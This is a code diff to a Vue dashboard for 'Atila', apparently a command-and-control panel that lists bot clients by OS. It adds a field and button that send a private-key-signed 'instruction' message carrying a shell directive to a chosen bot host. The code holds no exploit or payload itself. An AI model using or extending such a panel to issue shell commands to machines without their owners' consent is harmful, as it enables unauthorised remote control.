@@ -27,6 +27,34 @@
           mr-4
         '
       ></v-text-field>
+
+      <v-text-field
+        @change = 'sabeBotHost'
+        outlined
+        dense
+        v-model = 'botHost'
+        label = 'Connect Directly To A Bot'
+        color = 'rgba(189, 147, 249, 1)'
+        class = '
+          ml-4
+          mr-4
+        '
+      ></v-text-field>
+
+      <v-btn
+        x-small
+        outlined
+        tile
+        color = 'rgba(189, 147, 249, 1)'
+        width = '100%'
+        class = '
+          pl-4
+        '
+        @click = 'connectWithBot'
+      >
+        Connect to the Bot
+      </v-btn>
+
       <v-btn
         x-small
         outlined
@@ -59,7 +87,7 @@ import InteractionDialog from '@/components/dashboard/interaction-dialog.vue'
 import EventBus from '@/src/EventBus'
 import * as Service from '@/src/services'
 
-import { mapGetters } from 'vuex'
+import { mapGetters, mapActions } from 'vuex'
 
 export default Vue.extend({
   components: {
@@ -76,23 +104,49 @@ export default Vue.extend({
       { text: 'OS', value: 'system.name' },
     ],
     intervalIsActive: false,
+    botHost: '',
   }),
 
   computed: {
     ...mapGetters([
       'getAtilaHost',
       'getAtilaToken',
+      'getBotHost',
+      'getPrivateKey',
     ])
   },
 
   methods: {
+    ...mapActions([
+      'setBotHost',
+    ]),
+
+    async connectWithBot () {
+      const message = await Service.Crypto.sign(this.getPrivateKey, { shell: '/os' })
+
+      const reply = await new Service.Atila(
+        this.$axios,
+        this.getBotHost ? this.getBotHost : this.getAtilaHost,
+        '<nil>'
+      ).publishMessage('<nil>', 'instruction', message)
+      if (!reply) {
+        alert('Unable to connect')
+      }
+
+      console.log(reply)
+    },
+
+    sabeBotHost () {
+      this.setBotHost(this.botHost)
+    },
+
     interactionDialogUpdateClients () {
       EventBus.$emit('interactionDialogUpdateClients', this.selected)
       if (this.selected.length)
-        EventBus.$emit(`interactionDialogUpdateSelectedClient`, this.selected[0].id)
+        EventBus.$emit('interactionDialogUpdateSelectedClient', this.selected[0].id)
     },
 
-    async tableUpdate (targetPlatform?: string) {
+    async tableUpdate () {
       const clients = await new Service.Atila(this.$axios, this.getAtilaHost, this.getAtilaToken).getClients()
       if (clients)
         this.clients = clients
@@ -101,6 +155,8 @@ export default Vue.extend({
 
   mounted () {
     this.tableUpdate()
+
+    this.botHost = this.getBotHost
     
     EventBus.$on('clientsTableUpdate', async () => await this.tableUpdate())
   },
